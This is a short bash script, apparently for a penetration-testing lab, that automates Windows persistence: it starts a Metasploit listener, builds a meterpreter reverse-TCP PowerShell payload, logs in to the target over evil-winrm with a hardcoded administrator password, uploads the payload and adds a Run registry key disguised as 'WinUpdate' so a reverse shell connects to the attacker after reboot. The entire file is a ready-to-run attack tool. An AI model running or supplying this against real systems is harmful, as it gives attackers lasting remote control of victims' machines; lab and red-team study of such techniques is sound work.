#!/bin/bash
# Phase 7 Persistence - One-Shot Remote Setup via Evil-WinRM
# Author: Your Name

# ====== CONFIGURE THESE ======
TARGET_IP="192.168.56.105"         # Change to Windows VM IP
USERNAME="Administrator"           # Change to target admin user
PASSWORD="Rose2020#"       # Change to target admin password
LHOST="192.168.56.101"              # Your Kali IP
LPORT="4444"                        # Your listener port
PAYLOAD_NAME="persistence.ps1"
# =============================

echo "[+] Starting listener in background..."
msfconsole -q -x "use exploit/multi/handler; \
set payload windows/meterpreter/reverse_tcp; \
set LHOST $LHOST; set LPORT $LPORT; \
exploit" &

echo "[+] Generating PowerShell payload..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -f psh > $PAYLOAD_NAME

echo "[+] Uploading payload and setting persistence..."
evil-winrm -i $TARGET_IP -u $USERNAME -p $PASSWORD << EOF
upload $PAYLOAD_NAME C:\\Windows\\Temp\\$PAYLOAD_NAME
powershell -Command "reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' /v WinUpdate /t REG_SZ /d 'powershell.exe -ExecutionPolicy Bypass -File C:\\\\Windows\\\\Temp\\\\$PAYLOAD_NAME' /f"
EOF

echo "[+] Persistence setup complete."
echo "[+] When target reboots, reverse shell will auto-connect."
